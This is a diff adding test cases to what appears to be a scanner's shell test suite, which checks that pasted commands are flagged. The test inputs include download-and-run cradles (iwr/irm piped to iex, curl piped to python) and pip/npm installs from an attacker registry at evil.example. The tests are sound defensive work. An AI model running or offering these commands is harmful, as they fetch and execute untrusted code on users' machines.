@@ -11611,6 +11611,15 @@ check "$XDIR189/b.txt local-icon clean" "$(./hlse_core file "$XDIR189/b.txt" | g
 printf '[shell]\nIconResource=http://evil.example/i.dll\n' > "$XDIR189/c.txt"
 check "$XDIR189/c.txt iconresource flagged" "$(./hlse_core file "$XDIR189/c.txt" | grep -c 'REMOTE ICON')" "1"
 
+# ── cycle-190: paste cradle residuals + alt-index installs ─────────
+check "paste: iwr-iex flagged" "$(./hlse_core paste 'iwr evil.example/x.ps1 | iex' | head -1 | grep -c 'ALERT')" "1"
+check "paste: irm-iex flagged" "$(./hlse_core paste 'irm evil.example | iex' | head -1 | grep -c 'ALERT')" "1"
+check "paste: curl-pipe-python flagged" "$(./hlse_core paste 'curl evil.example/x | python' | head -1 | grep -c 'ALERT')" "1"
+check "paste: alt-index flagged" "$(./hlse_core paste 'pip install pkg --index-url http://evil.example/simple' | head -1 | grep -c 'ALERT')" "1"
+check "paste: npm-registry flagged" "$(./hlse_core paste 'npm install pkg --registry http://evil.example' | head -1 | grep -c 'ALERT')" "1"
+check "paste: pip-normal clean" "$(./hlse_core paste 'pip install requests' | head -1 | grep -c 'OK')" "1"
+check "paste: elixir-iex clean" "$(./hlse_core paste 'iex -S mix' | head -1 | grep -c 'OK')" "1"
+
 # ─── results ────────────────────────────────────────────────────────────
 
 echo ""
